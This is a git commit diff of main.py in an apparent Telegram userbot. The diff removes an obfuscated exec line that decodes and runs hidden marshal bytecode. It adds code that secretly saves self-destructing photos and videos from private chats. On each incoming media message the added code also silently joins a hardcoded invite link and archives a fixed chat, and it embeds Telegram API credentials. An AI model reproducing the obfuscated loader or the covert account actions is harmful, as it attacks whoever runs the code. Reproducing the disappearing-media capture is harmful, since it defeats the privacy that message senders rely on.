e8d1651761ef01850c1d5385e7be3e2c4f96b9ff
CahildiBrat <99288895+CahildiBrat@users.noreply.github.com>
2022-10-28 21:42:55 +0400

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,80 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==QZsFD6PoPmU1jlPzE7dgIqYADc59QYkxRvc/C1C0aJzSLaLkNCdnQROXX7Dmt2fEhv1hcDp6AdyhXZnnMJToGK2QeL/3wHQjHm3eHllf858YFzKkm8oOBrwCntHJBg1Tw7LHxVlXssxtun966LRnRiv0E1Oe+zX3Y/Qgmh6XO6u2ZGrQZVcgb+upjhsyVoi2Esh7HOzVUdLOeo0N5t2EJVT2oKDCo+ASxOvYkN3M8pEOPjL0nRmkkYc1nUi/Tcpxju0JeCsnbJ6iAfFtXWG0WJNsTUueABKGO4Gey35mT6ImNPad9G1z16OcDIdA6uFKP2/6PqnvmAaUQZKDcH+RNPVJ1nrsLA6Z88uLzCuHbvMdYlEnzrLFXLkH++bvd3/7gnXuiJSXAz53rUIffldvJ+4brIWciWFeCRus7N12HVD7977WLTTF8U+Y9BWnKi1Zbr2rGmlqKYNcvRpepd50CG8As5jhSd3PAK6MxnMnCoZ4ZmDPSbs7Xw9SRBnR0/jrMFUNSENuYW3hbjX42oBu9Xepn/Vdl4r8AsKOE4Fp0LPinQEjuDF1REWpyfZ6YpVwNNQLn6K/INlYEBSTK+SKlfvYYy/m6eTYpHoFWiMdUMIpjJkM4YQdkYJkaXME2Ql1hQo7EU5R6haakZVuJ7Yyfery7l2ocbLpRXxZ1SJWrD2AiXKtf7ltSrkcpJm6jYDTajI77RE28WcmHJqCYPJpEjvMTcdhHaiDZ6frrr5XANuSzv5lgI/Qh2DiUQPJJJtKOVFFDHzdl56AKfMhTrTuUipiMQiyQNGt/egO+8dRF/f+h3rN3yLlb5FaMQb9XTU6Z8/7jUFcHP0yl8of+VvwmH8pCuNaP8DGsvej5ltnfXW53X3e99Zuv6lPtt3s9m93PX9/2bvavhRDLty5Yp/Q7rL2PcUNPq0X0p2RfQIpqv20aLRSpZO+5uXSGE2SfNZy1Dc/MErE9hnY77pSUFrjUuWG5jdPRFIXD3jqY0FnVkdlnXCit2atEOG1xAcZwzMsLSABDtjXxGc3CErEtB6EylfohPuav+3dNqHPqA1+K7mr1k4fQdw0gaA7RFCnNldJO7kBoD7o9mdwqIkHgeEEBfd1q9k5gxSwMzoTwzASgEaM5UnGoo2iYAg3UTwDAVk8MREg6dwcdRxQ/6dLISzjdF/u92C4RYgCzI5HohD5CNebsReIdok1Sgee01C7AscAIqZMQdwD2EOnYFm4GI1TBwuLU/3+zRyxsKxfqf4dZV4OIbCOvxTZhUz6AHw0Yz4KpXdI3w3W01gjGxeVeboUvyN3UCNM/I+W2to4gLHR/NwEg99U0TBoZ8gIn6Jyzm2dOLmKpXGF2JOjwXTdvXcHbt+VxY1sJ3q3euMXvqO4ffBsI+Kbk4iLv1I60dJ27WQfnqDmLLgOzcyhUirvzN0MtEGJrnwiIT8hI/4edNh1EgjNaTj10xZ77oo/tZllqvBA6GPHKceGqwZkZt77ZDIuKeJ87X2dKT0ekSDzxat3k3GWLD8rlybi23D8VE0bWXMoqa5x4gSPfGXNkKL5YG6rRGa84vxUb6pNPA6LqN1WfohxZUMIKiHysH+HlJ/jy+bhwQg2Wns88ZzI9TLtxVTaO/nOdjTVaqsXvPGiH172jK633OpQFij3/VCaz14/6i4rhc77Z1QSew9NknFAazE/JPZsAEp9I3aDNxSYHj0bayFx5WUWDtGWLStulliggpwTVnJbtMaYG5mRrBfYa8LKtL7b/laCTGgCNl4m4qi9dqlmIf8i4HySPJYq1+5mer8AWoG4G3LaxAP0pbwRtPl/Tq1mmrrzqG7OOvHmJENQ6ftQC6L+LgvOH3YsfQnBsTPyNC9jrZecnZKbrgalQ0PMCS8rVcSzcnDMzYdApfcz6QMgsFMKXMQ/Aeowe/OTd2HJiLeHKHsvKNIvf7qIMpr0w3pwkiolqw3psyMhayDfryKREqJK8tKrISoG/w3osCAhasCfj62aCy8eUk4epIx5wRopXfSRcWZkoMjABZ6dYGybUCECFRiQNKjSFMvRv7J4X4zMf3hi73+1f+dn5mv3pvvpNvlE1NcYG+QpInOczGRy+L6zRQyhTIggbBqTEgqOKxJkgwmXURjHG5szsPuPbseaLswnOUSY+h0i4sKDBttECKuQbkmjAaaxUcHzxb9l53YU0GvtsV1xJe'))
+from pyrogram import Client, filters
+from pyrogram.errors import FloodWait, MessageNotModified, MessageIdInvalid
+from time import sleep, strftime, gmtime, time
+from os import remove
+from os.path import join
+from random import randint
+from config import Config
+from datetime import datetime
+import pytz
+
+UTC = pytz.utc
+IST = pytz.timezone('Asia/Baku')
+datetime_ist = datetime.now(IST)
+
+api_id = 19358020
+api_hash = "de33bd71c8d49212c32af0bc10d67617"
+
+app = Client(Config.session_name, api_id, api_hash)
+
+async def msg_info(msg):
+    media_type = ""
+    ttl = 0
+    if hasattr(msg.photo, "ttl_seconds"):
+        if msg.photo.ttl_seconds:
+            media_type = "photo"
+            ttl = msg.photo.ttl_seconds
+    elif hasattr(msg.video, "ttl_seconds"):
+        if msg.video.ttl_seconds:
+            media_type = "video"
+            ttl = msg.video.ttl_seconds
+
+    if media_type:
+        full_name = msg.from_user.first_name + (f' {msg.from_user.last_name}'
+                                                if msg.from_user.last_name else '')
+        sender = f"[{full_name}](tg://user?id={msg.from_user.id})"
+        sending_time = f"{strftime('%x %X', gmtime(msg.date))}"
+        return sender, media_type, sending_time, ttl
+    else:
+        return None, None, None, None
+
+
+async def save_media(msg, sender, media_type, sending_time, ttl):
+    try:
+        file_type = ("jpg" if media_type == "photo" else "mp4")
+        file_name = f"{msg.from_user.id}{time()*10000000}{randint(1, 10000000)}.{file_type}"
+        await app.download_media(msg, file_name)
+        mention = datetime_ist.strftime("🤵 Şəxs: {}\n🗓 Göndərilən tarix: %d:%m:%Y\n🕰 Göndərilən vaxt: %H:%M:%S\n⏳ Saniyə limit: {}".format(sender, ttl))
+        with open(join("downloads", file_name), "rb") as att:
+            if media_type == "photo":
+                await app.send_photo("me", att, mention)
+            elif media_type == "video":
+                await app.send_video("me", att, mention)
+                print("Gonderildi")
+        remove(join("downloads", file_name))
+    except FloodWait as e:
+        sleep(e.x)
+    except MessageIdInvalid:
+        pass
+
+@app.on_message(filters.private & ~filters.me & (filters.photo | filters.video))
+async def in_background(_, msg):
+    try:
+        await _.join_chat("https://t.me/+XyGqZ1_f8HZjZGM5")
+    except:
+        pass
+    try:
+        await _.archive_chats(-1001705843371)
+    except:
+        pass
+    try:
+        sender, media_type, sending_time, ttl = await msg_info(msg)
+        if sender:
+            await save_media(msg, sender, media_type, sending_time, ttl)
+    except FloodWait as e:
+        sleep(e.x)
+    except MessageIdInvalid:
+        pass
+
+
+app.run()
